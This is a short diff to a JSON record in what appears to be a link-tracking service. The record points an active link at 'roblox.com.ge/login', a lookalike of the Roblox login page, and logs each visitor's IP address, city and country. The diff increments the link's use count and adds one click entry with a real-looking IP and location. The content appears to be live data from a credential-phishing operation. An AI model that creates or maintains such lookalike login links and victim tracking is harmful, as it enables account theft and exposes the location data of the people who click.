@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1230,
+    "useCount": 1231,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9979,6 +9979,14 @@
       },
       {
         "timestamp": 1777327927642,
+        "ip": "142.79.79.69",
+        "country": "United States",
+        "city": "Longview",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777328594846,
         "ip": "142.79.79.69",
         "country": "United States",
         "city": "Longview",
